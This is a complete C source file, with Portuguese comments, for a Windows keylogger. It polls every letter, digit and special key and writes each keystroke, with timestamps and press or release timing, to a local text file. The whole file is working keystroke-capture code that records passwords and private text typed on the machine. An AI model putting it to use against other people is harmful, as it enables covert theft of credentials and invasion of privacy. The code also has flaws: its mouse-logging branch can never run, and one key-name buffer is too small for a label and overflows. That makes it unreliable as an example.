#include <stdio.h>
#include <windows.h> //para usar a api do windows

#define MAX_TECLAS 90 // o total de teclas que seram monitoradas
#define TEMPO_CLIQUE_MS 300 // tempo em milisegundos para diferenciar clique de pressionamento

typedef struct {
    int vk;
    int estava_pressionada;
    DWORD tempo_pressionou;
    char horario_pressionou[30];
    int eh_mouse;
} EstadoTecla;

EstadoTecla teclas[MAX_TECLAS]; // vetor para armazenar todas as teclas monitoradas
int total_teclas = 0; // variavel usada na função AdicionarTecla


void ObterHorario(char *buffer) {
    SYSTEMTIME st;
    GetLocalTime(&st);
    sprintf(buffer, "%02d/%02d/%04d %02d:%02d:%02d",
            st.wDay, st.wMonth, st.wYear,
            st.wHour, st.wMinute, st.wSecond);
}

// essa função torna humanamente legível o código vk das teclas
void VKParaString(int vk, char *buffer) {
    switch (vk) {
        // primeira parte contendo as teclas especiais
        case VK_SPACE:      strcpy(buffer, "ESPACO");    break;
        case VK_RETURN:     strcpy(buffer, "ENTER");     break;
        case VK_BACK:       strcpy(buffer, "BACKSPACE"); break;
        case VK_TAB:        strcpy(buffer, "TAB");       break;
        case VK_ESCAPE:     strcpy(buffer, "ESC");       break;
        case VK_SHIFT:      strcpy(buffer, "SHIFT");     break;
        case VK_CONTROL:    strcpy(buffer, "CTRL");      break;
        case VK_MENU:       strcpy(buffer, "ALT");       break;
        case VK_CAPITAL:    strcpy(buffer, "CAPS LOCK"); break;
        case VK_LEFT:       strcpy(buffer, "SETA ESQ");  break;
        case VK_UP:         strcpy(buffer, "SETA CIMA"); break;
        case VK_RIGHT:      strcpy(buffer, "SETA DIR");  break;
        case VK_DOWN:       strcpy(buffer, "SETA BAIXO");break;
        case VK_DELETE:     strcpy(buffer, "DELETE");    break;
        case VK_F1:  case VK_F2:  case VK_F3:  case VK_F4:
        case VK_F5:  case VK_F6:  case VK_F7:  case VK_F8:
        case VK_F9:  case VK_F10: case VK_F11: case VK_F12:
            sprintf(buffer, "F%d", vk - VK_F1 + 1);
            break;
        default:
            // numeros e letras
            if (vk >= '0' && vk <= '9') {
                buffer[0] = (char)vk; buffer[1] = '\0';
            } else if (vk >= 'A' && vk <= 'Z') {
                // validação usada para diferenciar maiúsculas de minúsculas
                // primeiro uso das funções da api win32
                int shift = (GetAsyncKeyState(VK_SHIFT) & 0X8000) ? 1 : 0; 
                int caps = (GetKeyState(VK_CAPITAL) & 0x0001) ? 1 : 0;
                buffer[0] = (shift ^ caps) ? (char)vk : (char)(vk + 32);
                buffer[1] = '\0';
            } else {
                // registra o código vk se não existir tradução
                // caso adicionar tecla que ainda não possui tradução
                sprintf(buffer, "VK_%d",vk);
            }
            break;
    }
}

// essa função adiciona as teclas monitoradas no vetor de structs
void AdicionarTecla(int vk) {
    // condição para evitar o estouro do limite do vetor teclas
    if (total_teclas >= MAX_TECLAS) return;
    teclas[total_teclas].vk = vk; // registra o codigo vk
    teclas[total_teclas].estava_pressionada = 0; // marca como não pressionada
    total_teclas++; // contador para atender limite de 90 teclas

}

// função para adicionar as teclas que serão monitoradas
void InicializarTeclas() {
    for(char c = 'A'; c <= 'Z'; c++) AdicionarTecla(c);
    for(char c = '0'; c <= '9'; c++) AdicionarTecla(c);

    AdicionarTecla(VK_SPACE);   AdicionarTecla(VK_RETURN);
    AdicionarTecla(VK_BACK);    AdicionarTecla(VK_TAB);
    AdicionarTecla(VK_ESCAPE);  AdicionarTecla(VK_SHIFT);
    AdicionarTecla(VK_CONTROL); AdicionarTecla(VK_MENU);
    AdicionarTecla(VK_CAPITAL); AdicionarTecla(VK_DELETE);

    AdicionarTecla(VK_LEFT); AdicionarTecla(VK_UP);
    AdicionarTecla(VK_RIGHT); AdicionarTecla(VK_DOWN);

    for (int i = 0; i < 12; i++) AdicionarTecla(VK_F1 + i);
}

void LimparEstadoTeclas() {
    for (int i = 0; i < total_teclas; i++) {
        GetAsyncKeyState(teclas[i].vk); // limpa o estado da tecla
        teclas[i].estava_pressionada = 0; // marca como não pressionada
    }
}

void ObterPosicaoMouse(int *x, int *y) {
    POINT pt;
    GetCursorPos(&pt);
    *x = pt.x;
    *y = pt.y;
}

// função com a lógica principal do funcionamento do monitor
void VerificarTeclas(FILE *arquivo) {
    char nome_tecla[10];
    char horario_atual[30];
    char linha[100];
    int x_in, y_in, x_out, y_out;

    for(int i = 0; i < total_teclas; i++) {
        int vk = teclas[i].vk;
        int esta_pressionada = (GetAsyncKeyState(vk) & 0x8000) ? 1 : 0; // verifica se a tecla está pressionada

        if (esta_pressionada && !teclas[i].estava_pressionada) {
            teclas[i].tempo_pressionou = GetTickCount(); // registra o tempo que a tecla foi pressionada
            ObterHorario(teclas[i].horario_pressionou); // registra o horário que
            teclas[i].estava_pressionada = 1; // marca como pressionada
            ObterPosicaoMouse(&x_in, &y_in); // registra a posição do mouse quando a tecla foi pressionada
            
        }
        if (!esta_pressionada && teclas[i].estava_pressionada) {
            DWORD tempo_soltou = GetTickCount(); // registra o tempo que a tecla foi solta
            DWORD duracao = tempo_soltou - teclas[i].tempo_pressionou; // calcula a duração que a tecla ficou pressionada

            VKParaString(vk, nome_tecla); // converte o código vk para string
            ObterHorario(horario_atual); // registra o horário atual
            ObterPosicaoMouse(&x_out, &y_out); // registra a posição do mouse quando a tecla foi solta

            if (duracao < TEMPO_CLIQUE_MS) {
                if (teclas[i].eh_mouse)
                    sprintf(linha, "[%s] CLIQUE %s em (%d, %d)\n",
                            horario_atual, nome_tecla, x_in, y_in);
                else
                    sprintf(linha, "[%s] CLIQUE: %s\n", horario_atual, nome_tecla);

                fputs(linha, arquivo);
            } else {
                if (teclas[i].eh_mouse) {
                    sprintf(linha, "[%s] PRESSIONOU %s em (%d, %d)\n",
                            teclas[i].horario_pressionou, nome_tecla, x_in, y_in);
                    fputs(linha, arquivo);

                    sprintf(linha, "[%s] SOLTOU %s em (%d, %d)\n",
                            horario_atual, nome_tecla, x_out, y_out);
                    fputs(linha, arquivo);
                } else {
                    sprintf(linha, "[%s] PRESSIONOU: %s\n",
                            teclas[i].horario_pressionou, nome_tecla);
                    fputs(linha, arquivo);

                    sprintf(linha, "[%s] SOLTOU: %s\n", horario_atual, nome_tecla);
                    fputs(linha, arquivo);
                }
            }
            fflush(arquivo); // garante que os dados sejam gravados no arquivo
            teclas[i].estava_pressionada = 0; // marca como não pressionada
        }
    }
}

int main() {
    InicializarTeclas();

    FILE *arquivo = fopen("teclas.txt", "a");
    if (arquivo == NULL) return 1;

    fprintf(arquivo, "===== NOVA SESSAO =====\n");
    fflush(arquivo);

    while(1) {
        VerificarTeclas(arquivo);
        Sleep(10); // evita que o programa consuma 100% da CPU
    }
}